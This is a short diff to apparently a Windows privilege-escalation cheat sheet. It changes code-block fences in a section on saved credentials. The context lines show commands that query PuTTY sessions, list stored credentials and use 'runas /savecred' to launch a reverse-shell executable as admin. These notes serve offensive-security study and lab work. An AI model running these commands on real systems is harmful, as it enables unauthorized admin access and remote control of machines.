@@ -98,7 +98,7 @@ reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
 
 ### Saved Creds
 Windows also allows users to save their credentials to the system, and these saved credentials can be used to bypass this requirement
- 
+ ```
 .\winPEASany.exe quiet cmd windowscreds
 // We can verify this manually using the following command:
 cmdkey /list
@@ -108,7 +108,8 @@ Exploit:
 ```
 //We can use the saved credential to run any command as the admin user. Start a listener on Kali and run the reverse shell executable:
 runas /savecred /user:admin C:\PrivEsc\reverse.exe
-```
+````
+
 ## Exploits
 
 ### Juicy potato
